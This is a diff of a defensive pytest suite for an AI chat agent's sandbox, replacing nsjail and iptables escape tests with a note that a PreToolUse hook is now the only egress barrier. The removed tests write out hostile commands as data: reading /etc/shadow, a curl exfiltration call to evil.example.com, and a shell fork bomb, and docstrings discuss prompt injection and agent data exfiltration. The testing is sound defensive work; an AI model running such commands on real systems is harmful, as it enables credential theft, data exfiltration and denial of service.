@@ -1,44 +1,42 @@
-"""G.3 — adversarial suite: prompt injection, sandbox escape, fuzz, replay.
+"""G.3 — adversarial suite: prompt injection, network policy, fuzz, replay.
 
 This is a documentation-as-code attack surface map. Every test below
 exercises one class of attack the cloud-chat threat model anticipates,
 and asserts the configured defense fires (the PreToolUse hook, the
-nsjail chroot, iptables OWNER rules, Slack HMAC verification, or the
-JWT session-binding check).
+E2B microVM, Slack HMAC verification, or the JWT session-binding check).
 
 Why it's worth shipping despite the heavy skip surface:
 
   * The tests are *executable runbooks*. A future operator deploying
     Agnes to a real customer can flip the env flags and get a green
-    bar attesting that the sandbox holds.
-  * Several of these tests fail open in the absence of the
-    docker-compose env (e.g. fork bomb, /etc/shadow) — wiring them up
-    as committed pytest scripts catches the case where someone weakens
-    the nsjail config without realising the regression.
+    bar attesting that the surface-level defenses hold.
+  * The hook tests (section A) run on any platform — they exec the
+    hook directly and assert deny. No docker, no E2B billing.
   * The fuzz + HMAC + replay tests work against the docker stack
-    without nsjail, so they're cheap insurance that the surface-level
-    checks (signature verification, JWT scoping) don't regress.
+    without exercising E2B sandboxes, so they're cheap insurance that
+    the surface-level checks (signature verification, JWT scoping)
+    don't regress.
+
+Under the E2B-provider model the old nsjail-direct and iptables-direct
+tests are gone — E2B's microVM is the isolation boundary, and per Q4
+the egress allowlist lives only in the PreToolUse hook. The
+filesystem-escape and network-escape assertions are therefore
+collapsed into PreToolUse-hook denial asserts, which are themselves
+the only barrier between the agent and the network.
 
 Gating:
-  * AGNES_E2E=1 — required for everything (the docker stack).
+  * AGNES_E2E=1 — required for the docker-backed tests (C, D, E).
   * AGNES_E2E_FAKE_AGENT=1 — required for prompt-injection (we don't
     want to spend real Anthropic credit driving the agent into a
     refuse path).
-  * Linux + nsjail — required only for the in-sandbox escape tests
-    (cat /etc/shadow, curl evil, fork bomb). These call directly into
-    SubprocessProvider and so reuse the skip helper from
-    tests/security/test_nsjail_escape.py.
+  * Section A (hook) runs everywhere — no gates.
 """
 
 from __future__ import annotations
 
-import asyncio
-import hashlib
-import hmac
 import json
 import os
 import secrets
-import shutil
 import sys
 import time
 import urllib.error
@@ -69,20 +67,12 @@ except ImportError:  # pragma: no cover
     _WS_AVAILABLE = False
 
 
-def _skip_unless_nsjail() -> None:
-    """Mirror tests/security/test_nsjail_escape.py — skip on macOS / no nsjail."""
-    if sys.platform == "darwin":
-        pytest.skip("nsjail tests don't run on darwin")
-    if shutil.which("nsjail") is None:
-        pytest.skip("nsjail not installed — required for in-sandbox escape tests")
-
-
 def _skip_unless_fake_agent() -> None:
+    """Reserved for future LLM-driven adversarial tests; currently
+    unused since section B's nsjail/iptables tests were removed."""
     if not os.environ.get("AGNES_E2E_FAKE_AGENT"):
         pytest.skip(
-            "G.3 prompt-injection tests require AGNES_E2E_FAKE_AGENT=1 "
-            "(deterministic echo runner — we're testing the hook layer, "
-            "not the LLM).",
+            "AGNES_E2E_FAKE_AGENT=1 required for LLM-driven adversarial tests",
         )
 
 
@@ -140,13 +130,13 @@ def test_pre_tool_use_refuses_rm_against_workspace_snapshots() -> None:
 
 
 def test_pre_tool_use_refuses_curl_to_non_allowlisted_host() -> None:
-    """Defense-in-depth: PreToolUse hook is layer 1, iptables is layer 2.
+    """Egress allowlist enforcement — the PreToolUse hook is the only barrier.
 
-    The hook's allowlist (ALLOWED_HOSTS) is anthropic + github + loopback.
-    Anything else must be denied at the hook layer so the LLM's reasoning
-    trace shows the refusal — even before iptables silently blackholes the
-    packet. (Hosts inside the allowlist are still subject to iptables
-    OWNER rules at the network layer.)
+    Under the E2B-provider model (per Q4) there is no firewall layer in
+    the sandbox template — the hook's allowlist (ALLOWED_HOSTS:
+    anthropic + github + loopback) is the only thing standing between
+    the agent and `evil.example.com`. Assert deny here; a fail-open in
+    the hook would silently expose every customer to data exfil.
     """
     decision = _run_hook(
         {
@@ -160,92 +150,20 @@ def test_pre_tool_use_refuses_curl_to_non_allowlisted_host() -> None:
 
 
 # ---------------------------------------------------------------------------
-# B. nsjail / iptables — sandbox escape attempts
+# B. (intentionally empty)
 # ---------------------------------------------------------------------------
 #
-# These reuse the SubprocessProvider directly (no FastAPI app needed),
-# mirroring tests/security/test_nsjail_escape.py. Re-asserted here from
-# the adversarial perspective so the suite documents the full threat
-# model in one place.
-
-
-def test_nsjail_blocks_read_of_etc_shadow(tmp_path: Path) -> None:
-    """Filesystem escape: /etc/shadow is outside the nsjail chroot mount set."""
-    _skip_unless_nsjail()
-
-    from app.chat.subprocess_provider import SubprocessProvider
-
-    async def _run() -> int:
-        prov = SubprocessProvider(
-            nsjail_path=shutil.which("nsjail"),
-            nsjail_config_template=Path("config/nsjail/chat-session.cfg.template"),
-            require_isolation=True,
-        )
-        handle = await prov.spawn(
-            workdir=tmp_path,
-            env={},
-            argv=["/bin/cat", "/etc/shadow"],
-        )
-        return await handle.wait()
-
-    rc = asyncio.run(_run())
-    assert rc != 0, "nsjail should block read of /etc/shadow"
-
-
-def test_iptables_blocks_curl_to_non_allowlisted_host(tmp_path: Path) -> None:
-    """Network escape: even if the LLM bypasses the hook, iptables OWNER drops.
-
-    Layer 2 — iptables filter on uid 1001 (agnes-sandbox). evil.example.com
-    is not in the allow rules (the iptables-setup.sh script seeds only
-    api.anthropic.com, api.github.com, etc.).
-    """
-    _skip_unless_nsjail()
-
-    from app.chat.subprocess_provider import SubprocessProvider
-
-    async def _run() -> int:
-        prov = SubprocessProvider(
-            nsjail_path=shutil.which("nsjail"),
-            nsjail_config_template=Path("config/nsjail/chat-session.cfg.template"),
-            require_isolation=True,
-        )
-        handle = await prov.spawn(
-            workdir=tmp_path,
-            env={"PATH": "/usr/bin:/bin"},
-            argv=["/usr/bin/curl", "--max-time", "3", "https://evil.example.com/leak"],
-        )
-        return await handle.wait()
-
-    rc = asyncio.run(_run())
-    assert rc != 0, "iptables OWNER + nsjail net=ns should block curl egress"
-
-
-def test_fork_bomb_terminated_by_rlimit_nproc(tmp_path: Path) -> None:
-    """Resource exhaustion: rlimit_nproc in the nsjail config caps PIDs.
-
-    A classic shell fork bomb (`:(){ :|:& };:`) should die within 10s
-    when rlimit_nproc trips. Without the cap this would hang forever
-    and starve the runner host of process slots.
-    """
-    _skip_unless_nsjail()
-
-    from app.chat.subprocess_provider import SubprocessProvider
-
-    async def _run() -> int:
-        prov = SubprocessProvider(
-            nsjail_path=shutil.which("nsjail"),
-            nsjail_config_template=Path("config/nsjail/chat-session.cfg.template"),
-            require_isolation=True,
-        )
-        handle = await prov.spawn(
-            workdir=tmp_path,
-            env={},
-            argv=["/bin/sh", "-c", ":(){ :|:& };:"],
-        )
-        return await asyncio.wait_for(handle.wait(), timeout=10)
-
-    rc = asyncio.run(_run())
-    assert rc != 0, "fork bomb should be capped by rlimit_nproc"
+# The pre-E2B revision exercised the in-sandbox escape surface here
+# (`cat /etc/shadow`, `curl evil`, fork bomb) by spawning a real nsjail
+# subprocess on the host. Under E2B the sandbox is a remote microVM —
+# the equivalent assertions would require burning real E2B sandbox
+# minutes for every test run, which the design (Q7) accepts for the
+# opt-in smoke suite at tests/e2e/test_e2b_smoke.py but rejects for the
+# default adversarial pass.
+#
+# The PreToolUse-hook assertion above (`test_pre_tool_use_refuses_curl
+# _to_non_allowlisted_host`) replaces the iptables-layer test — under
+# the Q4 fail-open egress decision the hook *is* the network policy.
 
 
 # ---------------------------------------------------------------------------
